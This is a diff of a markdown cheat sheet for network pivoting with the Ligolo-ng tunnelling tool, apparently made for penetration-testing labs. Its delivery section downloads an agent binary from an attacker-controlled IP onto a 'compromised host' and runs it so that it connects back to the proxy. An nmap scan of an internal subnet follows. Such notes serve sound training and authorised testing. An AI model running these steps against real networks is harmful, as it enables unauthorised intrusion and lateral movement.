@@ -1,27 +1,65 @@
 
 ## 🚀 Ligolo-ng Pivoting Cheat Sheet
 
-### Phase 1: Preparation (On Parrot OS)
+## 🔧 Install on Parrot OS (Proxy/Relay Server)
 
-First, ensure you have a statically compiled agent to avoid `GLIBC` errors on older targets.
+Parrot OS is Debian-based, so you can grab the latest precompiled binaries directly from GitHub. The current version is **0.8.2**.
 
-Bash
+bash
 
-```
-# 1. Build the static agent
-cd ~/ligolo-ng
-CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o ligolo-agent-static cmd/agent/main.go
+```bash
+# Create a working directory
+mkdir ~/ligolo-ng && cd ~/ligolo-ng
 
-# 2. Build the proxy
-go build -o ligolo-proxy cmd/proxy/main.go
+# Download the Linux proxy (your Parrot box)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
 
-# 3. Setup the TUN interface (Required for routing)
-sudo ip tuntap add user $USER mode tun ligolo
-sudo ip link set ligolo up
+# Download the Linux agent (for deploying to other Linux hosts)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
+
+# Download the Windows agent (amd64)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
+
+# Download the Windows agent (arm64, optional)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_arm64.zip
+
+# Extract everything
+tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
+unzip ligolo-ng_agent_0.8.2_windows_amd64.zip
+
+# Make binaries executable
+chmod +x proxy agent
 ```
 
 ---
 
+## 🌐 Set Up the TUN Interface (run once per session)
+
+bash
+
+```bash
+# Create the ligolo TUN interface (requires root)
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+
+# Verify it's up
+ip addr show ligolo
+```
+
+---
+
+## 🚀 Start the Proxy on Parrot
+
+bash
+
+```bash
+# Start with a self-signed cert on default port 11601
+sudo ./proxy -selfcert
+
+# Or bind to a specific interface/port
+sudo ./proxy -selfcert -laddr 0.0.0.0:11601
+```
 ### Phase 2: Delivery (Transfer to Target)
 
 Transfer the agent from your Parrot machine to the compromised host (DMZ01).
@@ -29,13 +67,9 @@ Transfer the agent from your Parrot machine to the compromised host (DMZ01).
 Bash
 
 ```
-# On Parrot (Host the file)
-python3 -m http.server 8080
-
-# On Target (Download and execute)
-wget http://10.10.14.111:8080/ligolo-agent-static -O /home/jbetty/ligolo-agent
-chmod +x /home/jbetty/ligolo-agent
+wget http://10.10.15.65:8080/agent
 ```
+
 
 ---
 
@@ -54,7 +88,7 @@ sudo ./ligolo-proxy -selfcert
 Bash
 
 ```
-/home/jbetty/ligolo-agent -connect 10.10.14.111:11601 -ignore-cert
+./agent -connect 10.10.15.65:11601 -ignore-cert
 ```
 
 **3. Activate the Session (Inside Ligolo-Proxy Terminal):**
@@ -84,4 +118,4 @@ Bash
 ```
 # Test the tunnel with a no-ping scan
 nmap -Pn -p 22 172.16.119.10
-```
+```p
